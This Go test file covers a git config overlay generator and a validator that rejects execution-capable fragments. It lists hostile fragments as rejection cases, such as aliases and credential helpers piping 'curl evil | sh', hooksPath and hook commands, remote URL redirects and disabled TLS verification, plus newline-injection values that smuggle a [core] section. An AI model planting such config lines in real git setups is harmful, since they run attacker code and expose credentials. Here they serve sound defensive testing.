package gitconf

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestGenerate(t *testing.T) {
	out := Generate(Input{
		BaseFragment: "[alias]\n\tst = status",
		Overlays: []Overlay{{
			Name: "acme", UserName: "Me", Email: "me@acme.example",
			Patterns: []string{"github.com/acme-inc/*"},
			Fragment: "[core]\n\thooksPath = ~/.config/acme/hooks",
		}},
		Dir: "~/.gitconfig.cclayer.d",
	})
	for _, want := range []string{
		"[alias]\n\tst = status",
		"[user]\n\tuseConfigOnly = true",
		`[includeIf "hasconfig:remote.*.url:https://[gG][iI][tT][hH][uU][bB].[cC][oO][mM]/[aA][cC][mM][eE]-[iI][nN][cC]/**"]`,
		`[includeIf "hasconfig:remote.*.url:git@[gG][iI][tT][hH][uU][bB].[cC][oO][mM]:[aA][cC][mM][eE]-[iI][nN][cC]/**"]`,
		`[includeIf "hasconfig:remote.*.url:ssh://git@[gG][iI][tT][hH][uU][bB].[cC][oO][mM]/[aA][cC][mM][eE]-[iI][nN][cC]/**"]`,
		"path = ~/.gitconfig.cclayer.d/acme.gitconfig",
	} {
		if !strings.Contains(out.Main, want) {
			t.Errorf("main missing %q:\n%s", want, out.Main)
		}
	}
	if strings.Contains(out.Main, "hooksPath") {
		t.Error("overlay fragment must not be in the unconditional file")
	}
	f := out.Files["acme.gitconfig"]
	if !strings.Contains(f, "email = me@acme.example") || !strings.Contains(f, "hooksPath") {
		t.Errorf("overlay file wrong:\n%s", f)
	}
}

func TestGenerateDefaultIdentity(t *testing.T) {
	out := Generate(Input{DefaultIdentity: &Overlay{UserName: "P", Email: "p@example.com"}})
	if !strings.Contains(out.Main, "email = p@example.com") || strings.Contains(out.Main, "useConfigOnly") {
		t.Errorf("unexpected:\n%s", out.Main)
	}
}

func TestCheckFragment(t *testing.T) {
	if err := CheckFragment("[user]\n\temail = x@y", true); err == nil {
		t.Error("[user] must be rejected")
	}
	if err := CheckFragment("[remote \"origin\"]\n\turl = https://x", true); err == nil {
		t.Error("remote url must be rejected")
	}
	if err := CheckFragment("[includeIf \"gitdir:x\"]\n\tpath = y", true); err == nil {
		t.Error("includeIf must be rejected")
	}
	for _, f := range []string{
		"[pull]\n\trebase = true\n[push]\n\tautoSetupRemote = true",
		"[init]\n\tdefaultBranch = main\n[merge]\n\tconflictstyle = zdiff3\n[core]\n\tautocrlf = input",
	} {
		if err := CheckFragment(f, false); err != nil {
			t.Errorf("harmless fragment rejected: %q: %v", f, err)
		}
	}
	for _, f := range []string{
		"[core]\n\thooksPath = ~/.config/acme/hooks",
		"[credential]\n\thelper = !curl evil",
		"[alias]\n\tpwn = !sh -c 'x'",
		"[alias]\n\tpwn = \"!curl evil | sh\"",
		"[alias]\n\tpwn = \\\n!sh",
		"[include]\n\tpath = /tmp/x",
		"[url \"git@evil:\"]\n\tinsteadOf = https://github.com/",
		"[gpg \"ssh\"]\n\tdefaultKeyCommand = evil",
		"[hook \"pre-commit\"]\n\tcommand = evil",
		"[sendemail]\n\tsmtpServer = /tmp/evil",
		"[sendemail]\n\tsendmailCmd = evil",
		"[imap]\n\ttunnel = evil",
		"[mergetool \"x\"]\n\tpath = /tmp/evil",
		"[browser \"x\"]\n\tcmd = evil",
		"[man]\n\tviewer = evil",
		"[gc]\n\trecentObjectsHook = evil",
		"[http]\n\tsslVerify = false",
		"[http]\n\tcurloptResolve = github.com:443:10.0.0.1",
		"[core]\n\tattributesFile = ~/.config/acme/attributes",
		"[branch \"main\"]\n\tpushRemote = mirror",
		"[merge]\n\ttool = evil",
		"[remotehelper \"x\"]\n\tfoo = bar",
		"[unknownsection]\n\tkey = value",
		"[submodule \"x\"]\n\tupdate = !evil",
		"[alias]\n\tlg = log --oneline",
		"[alias]\n\tx = -c core.pager=evil log",
		"[commit]\n\ttemplate = ~/.ssh/id_ed25519",
		"[branch \"main\"]\n\tdescription = x",
		"[pull]\n\ttwohead = evil",
		"[core]\n\tprotectNTFS = false",
		"[core]\n\tignorecase = true",
		"[fetch]\n\tfsckObjects = false",
		"[gc]\n\tpruneExpire = now",
		"[help]\n\tformat = web",
	} {
		if err := CheckFragment(f, false); err == nil {
			t.Errorf("exec-capable fragment must be refused without trust: %q", f)
		}
	}
	for _, f := range []string{
		"[core]\n\thooksPath = ~/.config/acme/hooks",
		"[alias]\n\tpwn = !sh -c 'x'",
		"[unknownsection]\n\tkey = value",
	} {
		if err := CheckFragment(f, true); err != nil {
			t.Errorf("trusted layer may use it: %q: %v", f, err)
		}
	}
	if err := CheckFragment("[include]\n\tpath = /tmp/x", true); err == nil {
		t.Error("includes are refused even for trusted layers")
	}
	out := Generate(Input{Overlays: []Overlay{{Name: "x", UserName: "Evil\n[core]\n\thooksPath = /tmp", Email: "a@b", Patterns: []string{"github.com/o/*"}}}})
	for _, line := range strings.Split(out.Files["x.gitconfig"], "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "hooksPath") || trimmed == "[core]" {
			t.Errorf("newline in identity injected a line: %q", line)
		}
	}
}

func TestEnsureIncludeBlock(t *testing.T) {
	orig := "[user]\n\tname = x\n[credential]\n\thelper = osxkeychain\n"
	out, changed := EnsureIncludeBlock(orig)
	if !changed || !strings.HasPrefix(out, orig) || !strings.HasSuffix(out, "path = "+IncludePath+"\n") {
		t.Fatalf("first add wrong:\n%s", out)
	}
	again, changed := EnsureIncludeBlock(out)
	if changed || again != out {
		t.Error("second run must be a no-op")
	}
	appended := out + "[core]\n\tautocrlf = input\n"
	moved, changed := EnsureIncludeBlock(appended)
	if !changed || !strings.HasSuffix(moved, Marker+"\n[include]\n\tpath = "+IncludePath+"\n") {
		t.Errorf("block not moved to the end:\n%s", moved)
	}
	if !strings.Contains(moved, "autocrlf = input") || strings.Count(moved, Marker) != 1 {
		t.Errorf("content lost or duplicated:\n%s", moved)
	}
	if RemoveIncludeBlock(moved) != orig+"[core]\n\tautocrlf = input\n" {
		t.Errorf("remove wrong:\n%q", RemoveIncludeBlock(moved))
	}
	if got, _ := EnsureIncludeBlock(""); !strings.HasPrefix(got, Marker) {
		t.Errorf("empty gitconfig: %q", got)
	}
	// git appended another include.path into our section
	withUser := out + "\tpath = ~/.gitconfig.work\n"
	moved, _ = EnsureIncludeBlock(withUser)
	if !strings.Contains(moved, "[include]\n\tpath = ~/.gitconfig.work\n") || strings.Count(moved, "[include]") != 2 {
		t.Errorf("user include must keep its section header:\n%s", moved)
	}
	if err := CheckFragment("[USER]\n\tname = x", true); err == nil {
		t.Error("section names are case-insensitive")
	}
}

// A pattern is validated by the manifest; Generate still strips what would
// open a new section, as the second lock.
func TestGenerateCleansPatterns(t *testing.T) {
	out := Generate(Input{Dir: "~/.gitconfig.cclayer.d", Overlays: []Overlay{{Name: "x", UserName: "A", Email: "a@b", Patterns: []string{"github.com/o/*\"]\n[core]\n\thooksPath = /tmp"}}}})
	if strings.Contains(out.Main, "[core]") || strings.Contains(out.Main, "\thooksPath") {
		t.Fatalf("pattern opened a section:\n%s", out.Main)
	}
	for _, line := range strings.Split(out.Main, "\n") {
		if strings.HasPrefix(line, "[") && !strings.HasPrefix(line, "[user]") && !strings.HasPrefix(line, "[includeIf \"hasconfig:") {
			t.Fatalf("unexpected section %q:\n%s", line, out.Main)
		}
	}
}

// What git parsed is what gets written: a trailing line continuation cannot
// swallow the line generated after the fragment, and subsection case and
// bare boolean keys survive.
func TestRenderFragment(t *testing.T) {
	out, err := RenderFragment("[pull]\n\trebase = true\n[branch \"Main\"]\n\tdescription = a \"b\" \\\\ c\n[core]\n\tbare\n[merge]\n\tlog = x \\\n")
	if err != nil {
		t.Fatal(err)
	}
	want := "[pull]\n\trebase = \"true\"\n[branch \"Main\"]\n\tdescription = \"a b \\\\ c\"\n[core]\n\tbare\n[merge]\n\tlog = \"x \"\n"
	if out != want {
		t.Fatalf("got:\n%s\nwant:\n%s", out, want)
	}
	again, err := ParseFragment(out)
	if err != nil {
		t.Fatal(err)
	}
	orig, _ := ParseFragment("[pull]\n\trebase = true\n[branch \"Main\"]\n\tdescription = a \"b\" \\\\ c\n[core]\n\tbare\n[merge]\n\tlog = x \\\n")
	if len(again) != len(orig) {
		t.Fatalf("round trip changed the entries: %v vs %v", again, orig)
	}
	for i := range orig {
		if again[i] != orig[i] {
			t.Errorf("entry %d: %+v vs %+v", i, again[i], orig[i])
		}
	}
}

// git itself resolves the overlay identity for a remote spelled in any case,
// as hosting services treat owner names without case.
func TestIncludeIfIgnoresCaseInGit(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	home := t.TempDir()
	out := Generate(Input{Dir: filepath.ToSlash(home), Overlays: []Overlay{{Name: "acme", UserName: "Me", Email: "me@acme.example", Patterns: []string{"github.com/acme-inc/*"}}}})
	os.WriteFile(filepath.Join(home, "main.gitconfig"), []byte(out.Main), 0o644)
	os.WriteFile(filepath.Join(home, "acme.gitconfig"), []byte(out.Files["acme.gitconfig"]), 0o644)
	for url, want := range map[string]string{
		"git@github.com:Acme-Inc/api.git":   "me@acme.example",
		"https://GitHub.com/ACME-INC/api":   "me@acme.example",
		"git@github.com:acme-inc-forks/api": "",
	} {
		repo := t.TempDir()
		run := func(args ...string) string {
			cmd := exec.Command("git", args...)
			cmd.Dir = repo
			cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL="+filepath.Join(home, "main.gitconfig"), "GIT_CONFIG_NOSYSTEM=1")
			b, _ := cmd.Output()
			return strings.TrimSpace(string(b))
		}
		run("init", "-q")
		run("remote", "add", "origin", url)
		if got := run("config", "user.email"); got != want {
			t.Errorf("%s: user.email = %q, want %q", url, got, want)
		}
	}
}

// The marker comment can go missing (git config --remove-section on the
// section above takes it along); the bare include is still ours and is
// replaced, never duplicated. Another include.path in the same section
// stays.
func TestIncludeBlockWithoutMarker(t *testing.T) {
	lost := "[user]\n\tname = me\n[include]\n\tpath = ~/.gitconfig.cclayer\n"
	out, changed := EnsureIncludeBlock(lost)
	if !changed || strings.Count(out, "~/.gitconfig.cclayer") != 1 || !strings.HasSuffix(out, Marker+"\n[include]\n\tpath = ~/.gitconfig.cclayer\n") {
		t.Fatalf("bare include not taken back:\n%s", out)
	}
	twice := lost + Marker + "\n[include]\n\tpath = ~/.gitconfig.cclayer\n"
	if out, _ := EnsureIncludeBlock(twice); strings.Count(out, "~/.gitconfig.cclayer") != 1 {
		t.Fatalf("duplicate include kept:\n%s", out)
	}
	shared := "[include]\n\tpath=~/.gitconfig.cclayer\n\tpath = ~/other.gitconfig\n"
	if got := RemoveIncludeBlock(shared); got != "[include]\n\tpath = ~/other.gitconfig\n" {
		t.Fatalf("other include lost or ours kept:\n%q", got)
	}
	// a section without our path is the user's, blank lines and all
	theirs := "[include]\n\tpath = ~/.gitconfig.local\n\n[user]\n\tname = Me\n" + Marker + "\n[include]\n\tpath = ~/.gitconfig.cclayer\n"
	if out, changed := EnsureIncludeBlock(theirs); changed || out != theirs {
		t.Fatalf("someone else's [include] section was rewritten:\n%q", out)
	}
}
